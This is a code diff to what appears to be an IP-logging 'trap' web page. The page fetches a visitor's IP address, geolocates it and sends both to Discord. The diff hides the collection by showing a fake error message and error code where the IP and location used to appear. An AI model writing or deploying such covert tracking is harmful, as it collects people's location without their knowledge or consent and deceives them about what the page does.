@@ -212,7 +212,7 @@
     ipDiv.style.display = 'block';
     ipDiv.textContent = 'Activating...';
     locationDiv.style.display = 'block';
-    locationDiv.textContent = 'Detecting location...';
+    locationDiv.textContent = 'Loading...';
 
     const success = await activateTrap();
     if (!success) {
@@ -227,11 +227,11 @@
       const ipResponse = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipResponse.json();
       const ip = ipData.ip;
-      ipDiv.textContent = `IP: ${ip}`;
-      
-      // Get location
       const location = await getLocation(ip);
-      locationDiv.textContent = location;
+      
+
+      ipDiv.textContent = 'An error occured!';
+      locationDiv.textContent = 'Error Code: 0x80070057';
       
       // Log to Discord
       await logToDiscord(ip, location, {
